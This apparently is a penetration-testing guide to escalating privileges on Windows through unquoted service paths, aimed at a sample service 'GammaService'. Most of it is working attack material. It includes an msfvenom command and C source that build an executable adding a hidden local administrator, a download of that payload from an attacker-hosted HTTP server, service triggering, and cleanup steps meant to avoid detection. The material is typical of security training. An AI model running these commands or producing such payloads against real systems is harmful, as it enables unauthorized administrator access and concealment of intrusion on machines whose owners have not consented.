Unquoted Service Paths

### Overview
Unquoted service paths present an opportunity for privilege escalation on Windows systems. When a service executable's path contains spaces and is **not enclosed in quotes**, Windows may misinterpret the path when starting the service. By exploiting this, an attacker can place a malicious executable in a writable directory, matching part of the unquoted path, and execute it with the privileges of the service (often LocalSystem).

---

### Step 1: Identify Unquoted Service Paths
Start by running **WinRecon.ps1** to enumerate services for unquoted paths:

1. **Option 2**: Run Custom Recon - (Select which functions to enable).
2. **Option 17**: Check services for **unquoted paths**.

#### Example Output:

![image](https://github.com/user-attachments/assets/7c50a419-eb9d-4751-800f-80de50e5afcc)


In this example, `GammaService` has an unquoted service path, making it a candidate for exploitation.

---

### Step 2: Verify Permissions and Start/Stop the Service
Before exploitation, confirm that:
1. You have permissions to **start** and **stop** the service.
2. You have **write permissions** in one of the directories derived from the unquoted path.

```powershell
net start <ServiceName>
net start GammaService
```

---

### Step 3: Create the Malicious Executable
The goal is to create an executable file that matches part of the unquoted path. In this case, we'll name the file `Current.exe` and place it in `C:\Program Files\Enterprise Apps`.

+
    ### Option 1 msfvenom
    ```bash
    msfvenom -p windows/exec CMD="cmd.exe /c net user taskmgrsvc Password123! /add && net localgroup administrators taskmgrsvc /add" -f exe-service -o <FileName>.exe
    ```
    ```bash
    msfvenom -p windows/exec CMD="cmd.exe /c net user taskmgrsvc Password123! /add && net localgroup administrators taskmgrsvc /add" -f exe-service -o Current.exe
    ```

+
    ### Option 2 Manual Compile
    #### Malicious Executable Code
    We will use C code to create a new local administrative user:
    ```c
    #include <stdlib.h>

    int main() {
        system("net user taskmgrsvc Password123! /add");
        system("net localgroup administrators taskmgrsvc /add");
        return 0;
    } 
    ```

    #### Compile the Executable
    On your Kali machine, cross-compile the C code:

    ```bash
    x86_64-w64-mingw32-gcc adduser.c -o Current.exe
    ```

---

### Step 4: Transfer the Malicious Executable
Host the executable on your attacker machine and transfer it to the target directory:

1. Start a Python HTTP server:
   ```bash
   python3 -m http.server 80
   ```
2. Download the executable on the target machine:
   ```powershell
   iwr -uri http://<attacker_ip>/Current.exe -OutFile 'C:\Program Files\Enterprise Apps\Current.exe'
   ```
3. Verify the file exists:
   ```powershell
   ls 'C:\Program Files\Enterprise Apps\Current.exe'
   ```

---

### Step 5: Trigger the Exploit
Start the vulnerable service to trigger the execution of the malicious file:

```powershell
Start-Service -Name GammaService
```

If the service is configured to run with **LocalSystem** privileges, your malicious `Current.exe` will execute with the same privileges.

---

### Step 6: Verify Exploitation
Check if the new user was created and added to the Administrators group:

1. Verify the new user:
   ```powershell
   net user
   ```
2. Verify the Administrators group:
   ```powershell
   net localgroup administrators
   ```

**Output**:
```plaintext
User accounts for \TARGETSYSTEM
-------------------------------------------------------------------------------
Administrator            taskmgrsvc              DefaultAccount

Alias name     administrators
Members
-------------------------------------------------------------------------------
Administrator
taskmgrsvc
```

The output confirms that the `taskmgrsvc` user was created and added to the Administrators group.

---

### Step 7: Cleanup
To avoid detection, clean up after exploitation:

1. Delete the malicious executable:
   ```powershell
   del 'C:\Program Files\Enterprise Apps\Current.exe'
   ```
2. Remove the created user:
   ```powershell
   net user taskmgrsvc /delete
   ```

---

### Notes:
- Unquoted service paths require specific conditions, such as missing quotes in the binary path and writable permissions in intermediate directories.
- Ensure you identify all writable paths before placing the malicious executable.
- Use PowerUp's `Get-UnquotedService` function to automate the discovery process:
   ```powershell
   Import-Module .\PowerUp.ps1
   Get-UnquotedService
   ```

---

### References
- [HackTricks - Unquoted Service Paths](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/unquoted-service-paths)
- Microsoft Documentation on Service Paths

---

**End of Unquoted Service Path Exploit Guide**
